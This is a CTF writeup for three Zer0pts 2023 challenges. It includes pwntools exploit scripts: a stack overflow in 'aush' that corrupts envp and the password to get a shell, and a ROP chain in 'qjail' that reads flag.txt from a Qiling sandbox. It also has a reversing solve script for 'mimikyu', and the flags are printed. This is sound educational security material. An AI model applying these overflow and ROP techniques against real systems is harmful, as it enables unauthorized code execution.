---
title: 'Writeup Zer0pts CTF 2023'
categories:
  - Pwnable
tags:
  - Pwn, Rev
published: true
date: 2023-07-19
---
# Zer0pts CTF 2023 writeup

## aush

![image](https://user-images.githubusercontent.com/31349426/253962920-32db84b4-6c32-4a7f-911b-f092cd5e7cba.png)

[Attachment](https://storage.googleapis.com/zer0ptsctf2023/1bac099b-9d6e-4689-847e-c0693b949c0a/aush_08f311931e81b109e10769690dbbf8eb.tar.gz)

```c
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define LEN_USER 0x10
#define LEN_PASS 0x20

int setup(char *passbuf, size_t passlen, char *userbuf, size_t userlen) {
  int ret, fd;

  // TODO: change it to password/username file
  if ((fd = open("/dev/urandom", O_RDONLY)) == -1)
    return 1;
  ret  = read(fd, passbuf, passlen) != passlen;
  ret |= read(fd, userbuf, userlen) != userlen;
  close(fd);
  return ret;
}

int main(int argc, char **argv, char **envp) {
  char *args[3];
  char inpuser[LEN_USER+1] = { 0 };
  char inppass[LEN_PASS+1] = { 0 };
  char username[LEN_USER] = { 0 };
  char password[LEN_PASS] = { 0 };

  if (system("/usr/games/cowsay Welcome to AUSH: AUthenticated SHell!") != 0) {
    write(STDOUT_FILENO, "cowsay not found\n", 17);
    return 1;
  }

  /* Load password and username file */
  if (setup(password, LEN_PASS, username, LEN_USER))
    return 1;

  /* Check username */
  write(STDOUT_FILENO, "Username: ", 10);
  if (read(STDIN_FILENO, inpuser, 0x200) <= 0)
    return 1;

  if (memcmp(username, inpuser, LEN_USER) != 0) {
    args[0] = "/usr/games/cowsay";
    args[1] = "Invalid username";
    args[2] = NULL;
    execve(args[0], args, envp);
  }

  /* Check password */
  write(STDOUT_FILENO, "Password: ", 10);
  if (read(STDIN_FILENO, inppass, 0x200) <= 0)
    return 1;

  if (memcmp(password, inppass, LEN_PASS) != 0) {
    args[0] = "/usr/games/cowsay";
    args[1] = "Invalid password";
    args[2] = NULL;
    execve(args[0], args, envp);
  }

  /* Grant access */
  args[0] = "/bin/sh";
  args[1] = NULL;
  execve(args[0], args, envp);
  return 0;
}
```
The program checks `inpuser` and `inppass`. If both of them are correct, we will get the shell.

Both `userbuf` and `passbuf` are randomize. Bruteforcing 16 and 32 bytes is so hard that I tried to find the bugs of that program.

As you can see, there is a buffer-overflow bug in `if (read(STDIN_FILENO, inpuser, 0x200) <= 0)`, but because `inpuser` is wrong, the program will execute `/usr/games/cowsay`.

But take notice that `envp` is an argument of the `main` function, so it will be below the address of `main`'s local variables.

We can modify `envp` via overflowing `userbuf`, so I changed `envp` to an invaild pointer. So `execve(args[0], args, envp);` will not execute `cowsay`.

```c
  char username[16]; // [rsp+40h] [rbp-80h] BYREF
  char inpuser[17]; // [rsp+50h] [rbp-70h] BYREF
  char password[32]; // [rsp+70h] [rbp-50h] BYREF
  char inppass[33]; // [rsp+90h] [rbp-30h] BYREF
 ```
 
 When I used IDA to analyze, I realized that we can modify `password` via overflowing `inpuser`. So:
 1. Overflowing `inpuser` to change `envp` and `password`
 2. Overflowing `inppass` to change `envp` to NULL ( vaild pointer to execute `/bin/sh`).

Exploit:
```python
from pwn import *
from time import sleep

context.binary = e = ELF("./aush")

gs="""
brva 0x01410
"""
def start():
    if args.LOCAL:
        p=e.process()
        if args.GDB:
            gdb.attach(p,gdbscript=gs)
            pause()
    elif args.REMOTE:
        p=remote(args.HOST,int(args.PORT))
    return p

p = start()
p.sendafter(b"Username: ",b"A"*0x200)

p.sendafter(b"Password: ",b"A"*0x20+b"\0"*(0x200-0x20))
p.interactive()
```

![image](https://user-images.githubusercontent.com/31349426/253970140-cf8cc068-55c2-4e30-ad28-9bf3fea9de86.png)

Flag: `zer0pts{p0lLut3_7h3_3nv1r0nnnNNnnnNnnnnNNNnnNnnNn}`

## qjail

![image](https://user-images.githubusercontent.com/31349426/253970337-8badf254-60e6-45ee-9d58-13ffc293514f.png)

[Attachment](https://storage.googleapis.com/zer0ptsctf2023/8a2aacd1-541e-4870-a1b2-a43245a3494e/qjail_d5be8ea3a16d38924a8ebdef24cad483.tar.gz)

```python
#!/usr/bin/env python3
import qiling
import sys

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <ELF>")
        sys.exit(1)

    cmd = ['./lib/ld-2.31.so', '--library-path', '/lib', sys.argv[1]]
    ql = qiling.Qiling(cmd, console=False, rootfs='.')
    ql.run()
```

The binray will be executed in Qilling emulator framework.

```c
#include <stdio.h>

int main() {
  char name[0x100];
  setbuf(stdin, NULL);
  setbuf(stdout, NULL);
  puts("Enter something");
  scanf("%s", name);
  return 0;
}
```

Taking a look at the binary's source code, the bug was easy to see.

So now I need debug that binray in Qilling. I have found [a useful document](https://docs.qiling.io/en/latest/debugger/), just adding `ql.debugger = True` before `ql.run()` and running `target remote localhost:9999` in GDB.

![image](https://user-images.githubusercontent.com/31349426/253974259-7ba7da34-2620-49fa-b390-cefc089ef597.png)

I've found the interesting thing that the stack canary always equals to `0x6161616161616100`, the vuln's text address is `0x7fffb7dd7000` and the libc's text address is `0x7fffb7dfd000`.

Because `rootfs` only contains `bin`, `lib` and `flag.txt`, so I will write a ROPchain to `orw` flag.txt.

```python
from pwn import *
from time import sleep

context.binary = e = ELF("./bin/vuln")
libc = ELF("./lib/libc.so.6")
gs="""
"""
def start():
    if args.LOCAL:
        p = process(["python","sandbox.py","./bin/vuln"])
        # if args.GDB:
        #     gdb.attach(p,gdbscript=gs)
        #     pause()
    elif args.REMOTE:
        p=remote(args.HOST,int(args.PORT))
    return p

p = start()
canary = 0x6161616161616100
shellcode = asm(shellcraft.cat("flag.txt",fd=1))
e.address = 0x7fffb7dd6000
libc.address = 0x7fffb7ddb000

rdi_ret = e.address+0x00000000000012a3
rsi_ret = libc.address+0x000000000002601f
rdx_ret = libc.address+0x0000000000142c92
_bss = 0x7fffb7dda000
pause()
p.sendline(b"A"*0x108+p64(canary)+p64(0)+
        p64(rdi_ret)+p64(0)+
        p64(rsi_ret)+p64(_bss)+
        p64(rdx_ret)+p64(0x100)+p64(libc.sym.read)+

        p64(rdi_ret)+p64(_bss)+
        p64(rsi_ret)+p64(0)+
        p64(libc.sym.open)+

        p64(rdi_ret)+p64(3)+
        p64(rsi_ret)+p64(_bss)+
        p64(rdx_ret)+p64(0x100)+p64(libc.sym.read)+

        p64(rdi_ret)+p64(1)+
        p64(rsi_ret)+p64(_bss)+
        p64(rdx_ret)+p64(0x100)+p64(libc.sym.write)
)
pause()
p.sendline(b"flag.txt\0")
p.interactive()
```
![image](https://user-images.githubusercontent.com/31349426/253975476-735406ed-87b7-45e7-9642-514808a1b440.png)

Flag: `zer0pts{Th1s_j4Il_f33Ls_m0R3_c0mF0rt4bL3_tH4n_r34L_3nv1r0nm3nt}`


## mimikyu

![image](https://user-images.githubusercontent.com/31349426/253975933-b9b93ab2-5f74-4c90-a982-dfc353c1a271.png)

[Attachment](https://storage.googleapis.com/zer0ptsctf2023/4626c769-3d2a-4d80-adec-8cad17678634/mimikyu_59c963b5bc5b5f22e3dcd9074963e18c.tar.gz)

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v4; // rdx
  __int64 v5; // rdx
  unsigned __int64 i; // [rsp+18h] [rbp-78h]
  unsigned __int64 j; // [rsp+20h] [rbp-70h]
  unsigned __int64 k; // [rsp+28h] [rbp-68h]
  char *inflag; // [rsp+30h] [rbp-60h]
  void *libc; // [rsp+40h] [rbp-50h]
  void *libgmp; // [rsp+48h] [rbp-48h]
  char base[16]; // [rsp+50h] [rbp-40h] BYREF
  char mod[16]; // [rsp+60h] [rbp-30h] BYREF
  char exp[24]; // [rsp+70h] [rbp-20h] BYREF
  unsigned __int64 v15; // [rsp+88h] [rbp-8h]

  v15 = __readfsqword(0x28u);
  if ( argc > 1 )
  {
    inflag = (char *)argv[1];
    if ( strlen(inflag) == 40 )
    {
      libc = LoadLibraryA("libc.so.6");
      if ( !libc )
        __assert_fail("hLibc != NULL", "main.c", 0x4Au, "main");
      libgmp = LoadLibraryA("libgmp.so");
      if ( !libgmp )
        __assert_fail("hGMP != NULL", "main.c", 0x4Cu, "main");
      ResolveModuleFunction(libgmp, 0x71B5428D, base);// __gmpz_init
      ResolveModuleFunction(libgmp, 0x71B5428D, mod);// __gmpz_init
      ResolveModuleFunction(libgmp, 0x71B5428D, exp);// __gmpz_init
      ResolveModuleFunction(libc, 0xFC7E7318, *(unsigned int *)main);// srandom
      ResolveModuleFunction(libc, 0x9419A860, _bss_start, 0LL);// setbuf
      printf("Checking...");
      for ( i = 0LL; i < 0x28; ++i )
      {
        if ( !(unsigned int)ResolveModuleFunction(libc, 1317667610, (unsigned int)inflag[i]) )// isprint
        {
LABEL_21:
          puts("\nWrong.");
          goto LABEL_22;
        }
      }
      for ( j = 0LL; j < 0x28; j += 4LL )
      {
        ResolveModuleFunction(libgmp, 0xF122F362, mod, 1LL);// __gmpz_set_ui
        for ( k = 0LL; k <= 2; ++k )
        {
          ResolveModuleFunction(libc, 0xD588A9, 46LL);// putchar('.')
          v4 = (int)ResolveModuleFunction(libc, 0x7B6CEA5D) % 0x10000;// rand
          cap(libc, libgmp, v4, (__int64)base);
          ResolveModuleFunction(libgmp, 0x347D865B, mod, mod, base);// __gmpz_set_ui
        }
        ResolveModuleFunction(libc, 0xD588A9, 46LL);// hcreate
        v5 = (int)ResolveModuleFunction(libc, 0x7B6CEA5D) % 0x10000;// memfrob
        cap(libc, libgmp, v5, (__int64)exp);
        ResolveModuleFunction(libgmp, 0xF122F362, base, *(unsigned int *)&inflag[j]);
        ResolveModuleFunction(libgmp, 0x9023667E, base, base, exp, mod);// powm
                                                // 
        if ( (unsigned int)ResolveModuleFunction(libgmp, 0xB1F820DC, base, encoded[j >> 2]) )// __gmpz_cmp_ui
          goto LABEL_21;
      }
      puts("\nCorrect!");
LABEL_22:
      ResolveModuleFunction(libgmp, 835473311, base);
      ResolveModuleFunction(libgmp, 835473311, mod);
      ResolveModuleFunction(libgmp, 835473311, exp);
      CloseHandle(libc);
      CloseHandle(libgmp);
      return 0;
    }
    else
    {
      puts("Nowhere near close.");
      return 0;
    }
  }
  else
  {
    printf("Usage: %s FLAG\n", *argv);
    return 1;
  }
}
```

The program checks whether `argv[1]` is the flag or not. It uses `ResolveModuleFunction` to call some functions in libc and libgpm instead of using the standard `dlresolve` function, which makes debugging more difficult. :)

Check out of this code:
```c
        ResolveModuleFunction(libgmp, 0xF122F362, base, *(unsigned int *)&inflag[j]);
        ResolveModuleFunction(libgmp, 0x9023667E, base, base, exp, mod);// powm
                                                // 
        if ( (unsigned int)ResolveModuleFunction(libgmp, 0xB1F820DC, base, encoded[j >> 2]) )// __gmpz_cmp_ui
          goto LABEL_21;
```

It will convert 4 bytes in `&inflag[j]` to `mpz_t` integer `base`, caculate `powm(base,exp,mod)` (base<sup>exp</sup> % mod)  and compare the value with `encoded[j>>2]`.

The size of the flag is 40 bytes, so the program will execute the code 10 times. This is because the code is designed to check each 4-byte chunk of the flag.

I just set breakpoint to that code and inspect the values of exp and mod each time.

![image](https://user-images.githubusercontent.com/31349426/253981326-afa1adf3-2443-4e23-848d-87069948abe1.png)

As you can see, this time exp = `0xf0d3` and mod = `0x2350f23a0dff`.

I checked the breakpoint 10 times, and I got a list of the values of exp and mod for each time.

Script to get the flag:
```python
from Crypto.Util.number import inverse
from os import popen
m = [0x2350f23a0dff,0x32d18e9d4d33,0x3866cd71f1b,0x10ae9be3fc8f,0x9d942eff67d,0x1de2e3aa8bb1,0x103fc65841f3,0x11a0970edc9, 0x5f8d20bddf39, 0x45b14e11e0ed] #  0x2350f23a0dff
e = [0xf0d3,0x85f,0x8e63,0x8249,0xc6a1,0xc6d,0xaef5,0xd5df,0xe68d,0xf3fb]


encoded = [0x00000FE4C025C5F4, 0x00001B792FF17E8A, 0x00000183B156AB40, 0x00000BEFFCF5E5DA, 0x00000297CF86E251, 0x00000EB3EDC1D4B4, 0x000000FA10CE3A08, 0x0000002BDD418672, 0x00005EBB5050EA46, 0x000005BF9B73CF86]

print(len(encoded))

flag = b''

def phi(N: int) -> int:
    ret = 1
    factors = popen(f"factor {N}").read().split(":")[1].rstrip().split(" ")[1:]

    for i in factors:
        ret *= int(i)-1
    return ret

for i in range(len(e)):

    y = encoded[i]
    e_ = e[i]
    m_ = m[i]
    d = inverse(e_,phi(m_))

    x = pow(y,d,m_)
    flag += x.to_bytes(4,'little')

print(flag)
```
![image](https://user-images.githubusercontent.com/31349426/253982503-e9e30723-0739-4b5a-8af2-5f745e86ec84.png)

Flag: `zer0pts{L00k_th3_1nt3rn4l_0f_l1br4r13s!}`
